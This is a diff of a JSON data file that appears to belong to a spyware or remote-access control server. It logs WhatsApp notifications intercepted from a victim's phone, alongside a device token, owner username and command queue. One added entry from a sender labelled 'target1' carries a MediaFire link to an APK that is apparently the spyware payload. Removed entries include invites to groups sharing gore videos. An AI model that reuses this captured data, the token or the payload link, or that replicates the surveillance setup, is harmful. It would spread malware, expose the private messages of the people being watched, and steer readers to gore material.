@@ -22,6 +22,46 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "target1",
+        "content": "https://www.mediafire.com/file/rf40t2gsg2am208/app-release.apk/file",
+        "time": "30/04 06:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502541152
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2667 pesan dari 17 chat",
+        "time": "30/04 06:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502537179
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (1214 pesan): ~ kholo kur kur",
+        "content": "💟 Stiker",
+        "time": "30/04 06:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502537156
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2666 pesan dari 17 chat",
+        "time": "30/04 06:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502536403
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (1213 pesan): ~ kholo kur kur",
+        "content": "p",
+        "time": "30/04 06:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502536375
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎2665 pesan dari 17 chat",
         "time": "30/04 06:53",
@@ -3979,46 +4019,6 @@
         "time": "30/04 06:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1777501057002
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (193 pesan): ~ bmt112",
-        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501056764
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2620 pesan dari 16 chat",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501056580
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗣𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗘𝗡𝗚𝗛𝗬𝗧𝗔𝗠𝗔𝗡 (159 pesan): ~ 𝖃i",
-        "content": "🔗 ℭ𝔞𝔯𝔱𝔢𝔩 𝔩𝔞𝔫𝔡☠︎ | https://chat.whatsapp.com/C1p12wOh0R4BtacohSWIRS GABUNG REK , 150 MEMBER , ADMIN BAGI BAGI 40VD GORE DAN 30STKR GORE🤤😋",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501056481
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (411 pesan): ~ ......",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501056217
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (13 pesan): ~ wanglin",
-        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501056056
       }
     ],
     "galleryPhotos": [],
@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777502534099,
+    "lastSeen": 1777502540103,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
